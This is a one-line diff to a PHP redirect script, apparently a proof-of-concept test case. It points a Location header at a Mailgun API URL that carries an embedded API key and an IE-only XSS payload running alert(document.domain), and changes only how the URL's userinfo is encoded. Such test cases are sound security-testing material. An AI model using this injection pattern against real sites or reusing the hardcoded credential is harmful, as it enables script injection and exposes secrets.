@@ -1,1 +1,1 @@
-<?php header('location: https://api:key-3ax6xnjp29jd6fds4gc373sgvjxteol0@api.mailgun.net/v3/samples.mailgun.org/log?XSS-IE-Only=XSS-IE-Only%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E'); ?>
+<?php header('location: https://api%3Akey-3ax6xnjp29jd6fds4gc373sgvjxteol0%40api.mailgun.net/v3/samples.mailgun.org/log?XSS-IE-Only=XSS-IE-Only%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E'); ?>
